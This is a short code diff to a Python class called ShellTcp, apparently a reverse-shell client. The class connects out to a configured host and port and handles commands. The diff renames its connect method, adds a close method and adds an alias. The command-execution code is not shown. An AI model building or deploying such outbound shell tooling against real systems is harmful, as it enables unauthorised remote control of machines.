@@ -12,7 +12,7 @@ class ShellTcp:
         self.socket = None
         self.commands = load_commands()
 
-    def servidor(self):
+    def start(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.connect((self.host, self.port))
         host_name, _ = self.socket.getsockname()
@@ -62,3 +62,14 @@ class ShellTcp:
             return b"[-] timeout"
         except Exception as e:
             return f"[-] {e}".encode()
+
+    def close(self):
+        if self.socket:
+            try:
+                self.socket.close()
+            except Exception:
+                pass
+            self.socket = None
+
+
+Shell = ShellTcp   # alias, pra funcionar com "from core.shell import Shell"
